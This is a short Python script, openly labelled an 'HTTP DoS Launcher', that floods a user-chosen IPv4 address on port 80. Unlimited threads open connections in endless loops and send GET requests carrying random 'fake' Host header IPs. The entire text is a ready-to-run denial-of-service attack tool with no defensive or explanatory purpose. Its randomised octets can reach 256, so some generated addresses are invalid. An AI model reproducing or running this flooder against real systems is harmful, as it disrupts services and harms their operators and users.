import socket
import threading
import random

print("Hi and welcome!")
print("==================================================================")
print("This is a HTTP DoS Launcher which is flooding port 80 only! ")
print("The IP address is not validated so please make sure it is valid!! ")
print("==================================================================")
print("\n")

target = input("Please specify the target IPv4 Address: ")

port = 80
attack_num = 0

def attack():
	global attack_num
	while True:
		first_byte = random.randint(0, 256)
		second_byte = random.randint(0, 256)
		third_byte = random.randint(0, 256)
		fourth_byte = random.randint(0, 256)
		
		fake_ip = "{}.{}.{}.{}".format(first_byte, second_byte, third_byte, fourth_byte)
		
		request = ("GET /" + target + " HTTP/1.1\r\n" + "Host: " + fake_ip + "\r\n\r\n")
		
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((target, port))
			sock.sendto(request.encode("ascii"), (target, port))

			attack_num += 1
			print(attack_num, fake_ip)
			
			sock.close()
			
		except:
			print("Connection refused!", attack_num, fake_ip)
			attack_num += 1

def threads():
	threads = int(input("Please choose the parallel threads number: "))
	for i in range (threads):
		thread = threading.Thread(target = attack)
		thread.start()
		
threads()
	
	
	
